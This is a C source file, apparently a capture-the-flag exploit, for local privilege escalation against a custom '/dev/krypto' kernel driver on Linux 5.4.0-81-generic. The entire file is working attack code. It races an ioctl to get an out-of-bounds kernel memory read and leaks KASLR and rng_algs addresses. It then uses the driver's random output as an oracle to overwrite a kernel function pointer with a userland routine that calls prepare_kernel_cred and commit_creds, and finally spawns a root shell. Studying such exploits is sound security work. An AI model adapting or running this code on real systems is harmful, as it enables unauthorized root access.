#define _GNU_SOURCE
#include <sched.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <pthread.h>
#include <stdint.h>
#include <errno.h>
#include <sys/utsname.h>
#include <string.h>

#define oob_read_size 0x1000000

struct rng_params {
    char *buf;
    size_t buf_len;
};

struct rng_params params = {
    .buf = (char *)0xdeadbeef,
    .buf_len = 0x100,  // rng structs created in the kernel appear to be size 0xc0, so pick something just a bit smaller
};

uintptr_t kaslr_base;
#define psi_avgs_work 0xf6ed0
#define delayed_work_timer_fn 0xb91e0
#define commit_creds 0xc4e80
#define prepare_kernel_cred 0xc5200
uintptr_t rng_algs;

volatile int done = 0;

void *caller(void *fd)
{
    cpu_set_t cs;
    CPU_ZERO(&cs);
    CPU_SET(0, &cs);
    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);

    int writer = *(int *)fd;

    while (!done) {
        params.buf_len = 0x100;
        int ret = ioctl(writer, 0x1337, &params);

        if (ret == -1 && errno == EINVAL) {
        } else if (ret == -1) {
            perror("wat ioctl");
        } else {
            for (off_t i = 0x100; i < oob_read_size; i++) {
                if (params.buf[i] != 0) {
                    done = 1;
                    break;
                }
            }
        }
    }

    return NULL;
}

void *racer(void *unused)
{
    cpu_set_t cs;
    CPU_ZERO(&cs);
    CPU_SET(1, &cs);
    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);

    while (!done) {
        int j;
        for (int i = 0; i < 10000; i++) {
            j += i;
        }

        params.buf_len = oob_read_size;
    }

    return NULL;
}

void elevate()
{
    void *c = ((void * (*)(int))(kaslr_base + prepare_kernel_cred))(0);
    ((void (*)(void *))(kaslr_base + commit_creds))(c);
}


int main()
{
    struct utsname u;
    uname(&u);
    if (strcmp(u.release, "5.4.0-81-generic") != 0) {
        fprintf(stderr, "Wrong kernel version");
        _exit(1);
    }

    if ((params.buf = mmap(NULL, oob_read_size, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0)) == MAP_FAILED) {
        perror("mmap");
    }

    // hold 3 instances which we'll actually use
    // oracle: to figure out what our random values are going to be
    // writer: to pass a kernel address as buf to overwrite with a value known from oracle
    // race_krypto: the one we'll "burn" when racing to get the OOB read
    int oracle, writer, race_krypto;
    if ((oracle = open("/dev/krypto", O_RDONLY)) < 0) {
        perror("oracle open");
    }
    if ((writer = open("/dev/krypto", O_RDONLY)) < 0) {
        perror("writer open");
    }
    if ((race_krypto = open("/dev/krypto", O_RDONLY)) < 0) {
        perror("race_krypto open");
    }

    // this will be closed later and then the kzallocs within the ioctl handler will keep reusing this space
    int holes[10];
    for (int i = 0; i < 10; i++) {
        if ((holes[i] = open("/dev/krypto", O_RDONLY)) < 0) {
            perror("hole open");
        }
    }

    int victims[500];
    for (int i = 0; i < 500; i++) {
        if ((victims[i] = open("/dev/krypto", O_RDONLY)) < 0) {
            perror("victim open");
        }
    }

    for (int i = 0; i < 10; i++) {
        close(holes[i]);
    }

    if (ioctl(oracle, 0x1337, &params) < 0) {
        perror("ioctl");
    }

    printf("rand %d\n", params.buf[0]);

    if (ioctl(writer, 0x1337, &params) < 0) {
        perror("ioctl");
    }

    printf("rand %d\n", params.buf[0]);

    pthread_t caller_t, racer_t;
    pthread_create(&caller_t, NULL, caller, (void*)&race_krypto);
    pthread_create(&racer_t, NULL, racer, NULL);

    pthread_join(caller_t, NULL);

    /* for (off_t i = 0; i < oob_read_size/8; i++) { */
    /*     uintptr_t v = ((uintptr_t *)params.buf)[i]; */
    /*     if (v != 0) { */
    /*         printf("%x: %p\n", i, v); */
    /*     } */
    /* } */

    for (off_t i = 0; i < oob_read_size/8 - 11; i++) {
        uintptr_t v = ((uintptr_t *)params.buf)[i];
        uintptr_t kaslr_signal = ((uintptr_t *)params.buf)[i + 4];
        uintptr_t rng_algs_signal = ((uintptr_t *)params.buf)[i + 11];

        // manually identified this pattern
        if (!rng_algs && (v >> 32) == 0xffffffff && (v & 0xfff) == 0x020 && rng_algs_signal == 0x1000000000) {
            rng_algs = v & ~0xff;
            printf("Found rng_algs at %p\n", (void*)rng_algs);
        }

        if (!kaslr_base && (v & 0xfffff) == psi_avgs_work && (kaslr_signal & 0xfffff) == delayed_work_timer_fn) {
            kaslr_base = v - psi_avgs_work;
        }

        if (kaslr_base && rng_algs) {
            break;
        }
    }

    if (!rng_algs) {
        fprintf(stderr, "unable to find rng_algs\n");
        _exit(1);
    }

    if (!kaslr_base) {
        fprintf(stderr, "unable to find kaslr_base\n");
        _exit(1);
    }

    printf("rng_algs: %p, kaslr_base: %p\n", (void*)rng_algs, (void*)kaslr_base);

    uintptr_t target = (uintptr_t)&elevate;
    printf("target %p\n", (void*)target);

    params.buf_len = 1;

    for (int i = 0; i < sizeof(target); i++) {
        printf("Writing byte %d\n", i);
        char desired = (target >> (i * 8)) & 0xff;

        char tmp;

        for (int j = 0;; j++) {
            //printf("attmpt %d\n", j);
            params.buf = &tmp;

            if (ioctl(oracle, 0x1337, &params) < 0) {
                perror("ioctl");
            }

            if (tmp == desired) {
                params.buf = (char *)(rng_algs + 8 + i); // .seed    could also do tfm cra_exit?
                if (ioctl(writer, 0x1337, &params) < 0) {
                    perror("ioctl");
                }
                break;
            } else {
                if (ioctl(writer, 0x1337, &params) < 0) {
                    perror("ioctl");
                }
            }
        }
    }

    fflush(stdout);

    // .seed has been overwritten, in theory opening a new krypto (which calls reset/seed) should call elevate
    int boom = open("/dev/krypto", O_RDONLY);

    puts("Boom?");

    char *shell[] = {
        "/bin/sh",
        NULL,
    };

    execve(shell[0], shell, NULL);

    return 0;
}
